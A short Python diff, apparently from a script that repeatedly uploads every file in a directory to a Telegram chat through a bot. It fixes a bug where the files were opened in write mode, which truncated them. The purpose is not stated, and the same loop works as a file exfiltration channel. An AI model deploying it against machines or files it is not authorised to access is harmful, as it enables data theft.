@@ -22,7 +22,7 @@ def main():
     bot = telegram.Bot(token)
     while True:
         for path in collect_files(directory):
-            with open(path, 'wb') as file:
+            with open(path, 'rb') as file:
                 bot.send_document(chat_id=chat_id, document=file )
             time.sleep(10)
         time.sleep(delay)
